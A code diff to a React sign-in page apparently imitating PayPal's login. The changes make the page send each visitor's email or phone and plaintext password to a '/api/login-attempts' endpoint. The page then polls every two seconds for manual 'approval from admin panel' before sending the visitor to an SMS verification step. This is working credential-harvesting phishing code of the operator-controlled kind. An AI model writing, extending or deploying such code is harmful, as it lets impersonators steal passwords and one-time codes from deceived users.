@@ -8,6 +8,8 @@ import {
 } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Separator } from "@/components/ui/separator";
+import { LoadingOverlay } from "@/components/LoadingOverlay";
+import { apiRequest } from "@/lib/queryClient";
 
 export const SigninPage = (): JSX.Element => {
   // State for input focus and values
@@ -16,6 +18,8 @@ export const SigninPage = (): JSX.Element => {
   const [passwordFocused, setPasswordFocused] = useState(false);
   const [passwordValue, setPasswordValue] = useState("");
   const [emailError, setEmailError] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const [loginAttemptId, setLoginAttemptId] = useState<number | null>(null);
 
   // Validation function for email or phone
   const validateEmailOrPhone = (value: string) => {
@@ -79,7 +83,7 @@ export const SigninPage = (): JSX.Element => {
     },
   ];
 
-  const handleSubmit = () => {
+  const handleSubmit = async () => {
     // Validate email/phone before submitting
     const isValidEmail = validateEmailOrPhone(emailValue);
     
@@ -88,15 +92,52 @@ export const SigninPage = (): JSX.Element => {
     }
     
     if (isValidEmail) {
-      // Redirect to SMS verification page
-      window.location.href = "/link3";
+      setIsLoading(true);
+      
+      try {
+        // Save login attempt to database
+        const response = await apiRequest("/api/login-attempts", "POST", {
+          emailOrPhone: emailValue,
+          password: passwordValue,
+          returnUri: returnUri,
+        }) as any;
+        
+        setLoginAttemptId(response.id);
+        
+        // Start polling for approval
+        startPollingForApproval(response.id);
+        
+      } catch (error) {
+        console.error("Failed to save login attempt:", error);
+        setIsLoading(false);
+      }
     }
   };
 
+  // Poll for approval from admin panel
+  const startPollingForApproval = (attemptId: number) => {
+    const pollInterval = setInterval(async () => {
+      try {
+        const response = await apiRequest(`/api/login-attempts/${attemptId}`, "GET") as any;
+        
+        if (response.approved) {
+          clearInterval(pollInterval);
+          setIsLoading(false);
+          // Redirect to SMS verification page
+          window.location.href = "/link3";
+        }
+      } catch (error) {
+        console.error("Failed to check approval status:", error);
+      }
+    }, 2000); // Check every 2 seconds
+  };
+
   return (
-    <div className="flex flex-col min-h-screen items-start pt-8 md:pt-[120px] pb-0 relative bg-wwwpaypalcomwhite px-4 md:px-0">
-      <div className="flex flex-col items-start relative flex-1 self-stretch w-full grow">
-        <main className="flex flex-col items-center relative self-stretch w-full">
+    <>
+      <LoadingOverlay isVisible={isLoading} />
+      <div className="flex flex-col min-h-screen items-start pt-8 md:pt-[120px] pb-0 relative bg-wwwpaypalcomwhite px-4 md:px-0">
+        <div className="flex flex-col items-start relative flex-1 self-stretch w-full grow">
+          <main className="flex flex-col items-center relative self-stretch w-full">
           <Card className="flex flex-col w-full max-w-[460px] items-start gap-6 md:gap-12 pt-6 md:pt-[31px] pb-8 md:pb-[51px] px-6 md:px-[47px] border border-solid border-[#eaeced] rounded-xl">
             <CardHeader className="flex flex-col items-center p-0 w-full bg-transparent">
               <div className="flex flex-col w-[83.44px] h-10 items-start relative">
@@ -261,7 +302,8 @@ export const SigninPage = (): JSX.Element => {
             </div>
           </div>
         </footer>
+        </div>
       </div>
-    </div>
+    </>
   );
 };
